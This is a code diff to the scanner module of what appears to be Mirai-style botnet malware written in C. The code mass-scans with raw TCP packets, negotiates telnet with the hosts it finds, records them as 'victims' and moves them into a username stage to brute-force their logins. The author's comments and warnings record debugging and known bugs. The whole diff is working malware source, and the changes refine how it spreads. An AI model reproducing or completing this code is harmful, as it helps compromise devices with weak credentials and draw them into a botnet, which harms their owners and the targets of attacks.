@@ -20,6 +20,7 @@ bool scan_scanning = false;
 
 void scan_init(void)
 {
+#	ifndef SCANNER_TEST
 	int32_t ret;
 
 	if ((ret = fork()) != 0)
@@ -31,6 +32,7 @@ void scan_init(void)
 			scan_able = false;
 		_exit(0);
 	}
+#	endif
 	return;
 }
 
@@ -87,13 +89,14 @@ uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int l
 #define TELNET_DONT 0xFE
 #define TELNET_CMD 0xFF
 #define TELNET_CMD_ECHO 1
-#define TELNET_CMD_WINDOW_SIZE 31
  
-bool scan_negotiate(int sock, unsigned char *buf, int len) {     
-	if (buf[1] == TELNET_DO && buf[2] == TELNET_CMD_WINDOW_SIZE)
+static inline __attribute__((always_inline)) bool scan_negotiate(int32_t sock, unsigned char *buf, int16_t len)
+{
+	printd("Negotiating sock %d with str %x %x", sock, buf[0], buf[1]);
+	if (buf[0] == TELNET_DO)
 	{
-		unsigned char tmp1[4] = {255, 251, 31};
-		unsigned char tmp2[10] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
+		unsigned char tmp1[3] = {255, 251, 31};
+		unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
 
 		if (send(sock, tmp1, 3, 0) < 0)
 			return false;
@@ -102,7 +105,7 @@ bool scan_negotiate(int sock, unsigned char *buf, int len) {
 
 		return true;
 	}
-	 
+
 	for (uint8_t i = 0; i < len; i++)
 	{
 		if (buf[i] == TELNET_DO)
@@ -116,32 +119,75 @@ bool scan_negotiate(int sock, unsigned char *buf, int len) {
 	return true;
 }
 
+static inline __attribute__((always_inline)) void xselect(int32_t fd)
+{
+	fd_set fdset;
+	struct timeval timeout;
+	timeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
+	timeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
+
+	FD_ZERO(&fdset);
+	FD_SET(fd, &fdset);
+	select(fd + 1, &fdset, NULL, NULL, &timeout);
+}
 
 uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
 {
-	int16_t i = 0, maxlen = -1, minlen = -1;
-	unsigned char *buf = malloc(1);
+	/*
+	// This code right here works
+	// WHAT THE _____
+	// Fill in whatever you find apropriate on that line
+	// So essentially this code actually works with nonblocking and everything
+	// I think it actually works because it waits on the select to make sure that theres data to read
+	// then it reads it
+	// I'm trying so hard not swear rn
 
-	fd_set fdset;
-	struct timeval stimeout;
-	stimeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
-	stimeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
+	struct timeval asdasdasd;
+	asdasdasd.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
+	asdasdasd.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
+	fd_set xas;
+	FD_ZERO(&xas);
+	FD_SET(sock, &xas);
+	int xret;
+	xret = select(sock + 1, &xas, NULL, NULL, &asdasdasd);
+	printd("Select ret %d", xret)
 
-	FD_ZERO(&fdset);
-	FD_SET(sock, &fdset);
-	if (select(sock + 1, &fdset, NULL, NULL, &stimeout) < 1)
-		return 0;
-
-	while (*strs)
+	unsigned char bigbuf[1000];
+	int ret;
+	if ((ret = recv(sock, bigbuf, sizeof(bigbuf), MSG_NOSIGNAL)) < 0) // Read 1 from socket
 	{
+		printd("Error %d: %s", errno, strerror(errno));
+		return 0;
+	}
+	else
+	{
+		printd("Read %d bytes: %s", ret, bigbuf)
+	}
+	return 1;
+	*/
+
+	/*
+	Alright so it turns out this code worked the whole time and the 10h I spend debugging it were useless
+	Essetnailly because it was in a while (1) loop it would recv() properly until there was no data to read
+	Since I had no message that showed success it just kept going until it failed
+	I guess the strcmp() like func wasn't working so anyway I mreally messed up
+	*/
+
+	int16_t i = 0, maxlen = -1, minlen = 1024;
+	unsigned char *buf = malloc(sizeof(unsigned char *));
+
+	while (*strs != NULL)
+	{
+		// printf("%s\n", *strs);
 		int16_t _len = strlen(*strs++);
 		if (_len > maxlen)
 			maxlen = _len;
 		if (_len < minlen)
 			minlen = _len;
 	}
-	while (*strs2)
+	while (*strs2 != NULL)
 	{
+		// printf("%s\n", *strs2);
 		int16_t _len = strlen(*strs2++);
 		if (_len > maxlen)
 			maxlen = _len;
@@ -149,85 +195,73 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 			minlen = _len;
 	}
 
-	unsigned char mbuf[maxlen + 100];
+	unsigned char mbuf[1024];
 	while (1)
 	{
+		xselect(sock);
 		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) // Read 1 from socket
 		{
 			printd("Error %d: %s", errno, strerror(errno));
 			return 0;
 		}
+		#warning Instead of checking for 0xFF every read why not make that a stage in the switch() on the scanner
 		if (*buf == TELNET_CMD)
 		{
-			uint8_t longbuf[4];
-			if (recv(sock, longbuf, 3, MSG_NOSIGNAL) <= 0)
+			uint8_t longbuf[2];
+			if (recv(sock, longbuf, 2, MSG_NOSIGNAL) <= 0)
 			{
 				printd("Error %d: %s", errno, strerror(errno));
 				return 0;
 			}
-			scan_negotiate(sock, longbuf, 3);
+			if (scan_negotiate(sock, longbuf, 2) == false)
+			{
+				printd("Failed to negotiate");
+			}
 		}
 		else
 		{
-			mbuf[i] = *buf;
+			mbuf[i++] = *buf;
+			// printf("mbuf = \"%s\"\n", mbuf);
+			// printf("%x\n", mbuf[strlen((const char *)mbuf) - 1]);
 		}
 		if (i >= minlen)
 		{
-			while (*strs)
+			#warning This needs to be fixed. Because of the min max stuff it's already gone thru all and is null. I needa change that
+			while (*strs != NULL)
 			{
+				printf("Comparing %s to %s\n", mbuf, *strs);
 				if (subcasestr((const char *)mbuf, *strs++) != -1)
 					return 1;
 			}
-			while (*strs2)
+			while (*strs2 != NULL)
 			{
+				printf("Comparing %s to %s\n", mbuf, *strs2);
 				if (subcasestr((const char *)mbuf, *strs2++) != -1)
 					return 2;
 			}
 		}
-		i++;
 	}
 	return 0;
 }
 
-// uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
-// {
-// 	fd_set myset;
-// 	struct timeval tv;
-// 	tv.tv_sec = timeout;
-// 	tv.tv_usec = timeoutusec;
-// 	unsigned char *initialRead = NULL;
-
-// 	while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
-// 	{
-// 		FD_ZERO(&myset);
-// 		FD_SET(fd, &myset);
-// 		if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
-// 		initialRead = buffer + bufferUsed;
-// 		got = recv(fd, initialRead, 1, 0);
-// 		if(got == -1 || got == 0) return 0;
-// 		bufferUsed += got;
-// 		if(*initialRead == 0xFF)
-// 		{
-// 			got = recv(fd, initialRead + 1, 2, 0);
-// 			if(got == -1 || got == 0) return 0;
-// 			bufferUsed += got;
-// 			if(!negotiate(fd, initialRead, 3)) return 0;
-// 		} else {
-// 			if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
-// 		}
-// 	}
-
-// 	if(found) return 1;
-// 	return 0;
-// }
+bool scan_setnonblock(int32_t fd)
+{
+	if (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)) == -1)
+	{
+		printd("Failed to set nonblocking error %d: %s", errno, strerror(errno));
+		return false;
+	}
+	return true;
+}
 
 bool scan_scanner(void)
 {
 	int32_t max = getdtablesize();
 	printd("Maximum files open: %d", max)
+#	ifndef SCANNER_TEST
 	if (scan_able == false || scan_scanning == true)
 		_exit(0);
-
+#	endif
 	scan_scanning = true;
 	printd("Initializing Scanner")
 
@@ -317,9 +351,7 @@ bool scan_scanner(void)
 
 	while (1)
 	{
-#		ifdef SCANNER_TEST
-		for (i = 0; i < 1; i++) // Send one packet if we are testing the scanner
-#		else
+#		ifndef SCANNER_TEST
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 #		endif
 		{
@@ -382,6 +414,7 @@ bool scan_scanner(void)
 				continue;
 
 			// Send back a ack rst to close any running threads on the telnet server
+			/*
 			iph->saddr = LOCAL_ADDR;
 			iph->daddr = riph->saddr;
 			iph->ihl = 5;
@@ -412,7 +445,7 @@ bool scan_scanner(void)
 
 			addr.sin_addr.s_addr = iph->daddr;
 
-			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
+			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)); */
 
 			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));
 			struct scan_victim *victim;
@@ -462,14 +495,11 @@ bool scan_scanner(void)
 							break;
 						}
 
-						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
-						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+						// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+						// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
 
-						if (fcntl(victim_table[i].sock, F_SETFL, O_NONBLOCK | fcntl(victim_table[i].sock, F_GETFL, 0)) == -1)
-						{
-							printd("%d->%s Failed to set nonblocking error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
+						if (scan_setnonblock(victim_table[i].sock) == false)
 							victim_table[i].state = FINISHED;
-						}
 
 						if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
 						{
@@ -487,7 +517,7 @@ bool scan_scanner(void)
 					{
 						FD_ZERO(&fdset);
 						FD_SET(victim_table[i].sock, &fdset);
-						if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) == -1)
+						if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) <= 0)
 						{
 							printd("%d->%s Failed to select error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
 							victim_table[i].state = FINISHED;
@@ -507,7 +537,7 @@ bool scan_scanner(void)
 							else
 							{
 								// Does this line remove nonblock? If so I gotta remov this
-								fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) & (~O_NONBLOCK));
+								// fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) & (~O_NONBLOCK));
 								victim_table[i].state = USERNAME;
 							}
 						}
